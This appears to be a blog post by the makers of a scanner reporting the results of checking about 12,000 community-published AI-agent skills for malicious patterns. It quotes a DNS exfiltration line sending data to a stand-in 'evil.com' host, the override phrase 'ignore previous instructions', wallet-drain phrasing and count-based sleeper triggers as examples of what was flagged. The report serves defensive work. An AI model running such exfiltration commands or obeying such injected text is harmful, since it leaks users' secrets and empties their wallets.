# We Scanned 12,000 AI Agent Skills — Here's What We Found

The OpenClaw skill ecosystem just crossed 12,000 community-published skills. Anyone can write one. Anyone can install one. Most people don't read the source code first.

So we scanned all of them.

## The Numbers

**12,056 skills scanned** across two major repositories — the official `openclaw/skills` registry and `BankrBot/openclaw-skills`. Every skill was run through MoltCops' 35-rule detection engine, the same scanner available at [scan.moltcops.com](https://scan.moltcops.com).

| Tier | Count | % | What It Means |
|------|-------|---|---------------|
| ✅ TRUSTED | 11,160 | 92.5% | Clean. No findings, or low-severity only. |
| ⚠️ CAUTION | 865 | 7.2% | Has patterns worth reviewing — env var access, package installs, eval() calls. Not malicious by default, but worth a second look. |
| 🟡 WARNING | 20 | 0.17% | Multiple suspicious patterns. Prompt injection markers, webhook URLs, data exfiltration techniques. |
| 🔴 DANGER | 11 | 0.09% | Critical findings. Sleeper triggers, DNS exfiltration, drain patterns, prompt injection. |

**The good news:** 92.5% of the ecosystem is clean. The vast majority of skill authors are building legitimate tools.

**The uncomfortable part:** 896 skills were flagged, and 31 of those are serious enough to warrant manual review before anyone installs them. In an ecosystem where `install skill-name` is one command, that's a real attack surface.

## What We Found in the DANGER Zone

The 11 DANGER-rated skills triggered critical-severity rules — the kind of patterns you'd see in actual malware:

**Sleeper triggers** (PL-045): Code that activates after a count threshold. `if (count >= 10)` — do nothing suspicious for the first 9 runs, then execute the payload. Classic time-bomb pattern.

**DNS exfiltration** (MC-031): Using `nslookup` or `dig` to encode stolen data as DNS subdomains. `nslookup ${chunk}.exfil.evil.com` sends your data out disguised as DNS queries — invisible to most firewalls.

**Drain patterns** (PL-040): Instructions like "transfer all" or "send all remaining" — designed to empty wallets.

**Prompt injection** (PL-060): The classic "ignore previous instructions" — attempting to override the agent's system prompt to hijack its behavior.

**Key extraction** (PL-001): Direct attempts to make the agent reveal private keys, seed phrases, or secrets.

Here are the 11 skills that triggered DANGER:

- `aviv4339/indirect-prompt-injection` — Sleeper trigger + webhook.site exfil + prompt injection
- `davidajohnston/everclaw-inference` — Key export + drain pattern + sleeper trigger
- `dgriffin831/skill-scan` — Drain pattern + DNS exfil + sleeper trigger
- `georges91560/security-sentinel-skill` — Sleeper trigger + DNS exfil + prompt injection
- `paolorollo/openclaw-sec` — Secret extraction + sleeper trigger + webhook.site
- `seojoonkim/prompt-guard` — Secret extraction + sleeper trigger + webhook.site
- `starbuck100/ecap-security-auditor` — Dependency confusion + DNS exfil + prompt injection
- `kylehuan/skill-security-audit` — Drain pattern + DNS exfil + prompt injection
- `pepe276/moltbookagent` — Sleeper trigger + encoded key exfil
- `nightfullstar/openclaw-defender` — Drain pattern + webhook.site + prompt injection
- `sschepis/alephnet-node` — Secret extraction + sleeper trigger + unsafe package install

## The Irony

Here's what's fascinating: **8 of the 11 DANGER skills are security tools themselves.**

`prompt-guard`. `security-sentinel-skill`. `openclaw-defender`. `skill-security-audit`. They're scanners, auditors, monitors — tools that claim to protect you from exactly the patterns they contain.

Some of these are genuinely just security tools that reference attack patterns in their detection rules or test suites. MoltCops flags them because the code *contains* `nslookup ${chunk}.exfil.evil.com` — whether it's executing it or scanning for it, the pattern is there.

But that's actually the point. **A scanner this thorough that it flags code describing attack patterns, not just code executing them, is a feature.** It means nothing slips through by hiding behind "it's just a test" or "it's just documentation." Every pattern gets surfaced. The human (or a more context-aware second pass) makes the call.

And some of these "security tools" aren't what they claim to be. A skill named `openclaw-defender` that contains drain patterns and webhook exfiltration URLs? That deserves scrutiny, not a free pass because it has "defender" in the name. Naming a Trojan horse "security-scanner" is the oldest trick in the book.

## The CAUTION Layer: 865 Skills

Most flagged skills aren't malicious. They're just doing things that *could* be misused:

| Pattern | Count | Why It Flags |
|---------|-------|-------------|
| Config exposure (PL-086) | 567 | Reads `process.env` or config files — normal for API tools, suspicious in a calculator |
| Unsafe package install (MC-025) | 351 | Runs `npm install` or `pip install` at runtime — legitimate but risky if the package name is attacker-controlled |
| Sleeper-adjacent triggers (PL-045) | 309 | Count-based conditionals — mostly benign pagination/retry logic |
| Code injection vectors (PL-085) | 234 | `eval()`, `new Function()` — sometimes necessary, often dangerous |
| DNS/webhook patterns (MC-031) | 112 | External network calls to uncommon endpoints |

The CAUTION tier is where context matters most. A trading bot reading `process.env.API_KEY` is expected. A "fun facts" skill doing the same thing is suspicious. MoltCops flags both — you decide.

## What This Means for the Ecosystem

12,000 skills is a milestone. It means the OpenClaw ecosystem is growing fast. It also means the attack surface is growing fast.

Right now, installing a skill is a trust exercise. You're giving someone else's code access to your agent — which often has access to your files, your messages, your wallet, your life. The 92.5% clean rate is reassuring. The 31 serious findings are a wake-up call.

**What you can do today:**

1. **Scan before you install.** Run skills through [scan.moltcops.com](https://scan.moltcops.com) before adding them to your agent.
2. **Add the GitHub Action.** If you publish skills, add MoltCops to your CI pipeline. Every PR gets scanned automatically.
3. **Read the findings, not just the score.** A CAUTION skill reading env vars for a legitimate API integration is fine. A CAUTION skill reading env vars with no clear reason isn't.

## Methodology

- **Scanner:** MoltCops Community Scanner v1.0
- **Rules:** 35 detection rules across prompt-layer (PL) and malicious-code (MC) categories
- **Sources:** `openclaw/skills` registry + `BankrBot/openclaw-skills`
- **Date:** February 22, 2026
- **Total findings:** 8,169 individual pattern matches across 5,412 skills
- **Scoring:** Each finding contributes to a cumulative risk score. Tier thresholds: TRUSTED (score ≥ 60), CAUTION (score 40-59), WARNING (score 20-39), DANGER (score < 20)

Full scan data is available for independent verification.

---

🔗 **Scan your skills:** [scan.moltcops.com](https://scan.moltcops.com)
🐦 **Follow the project:** [@dontdeleteai](https://x.com/dontdeleteai)
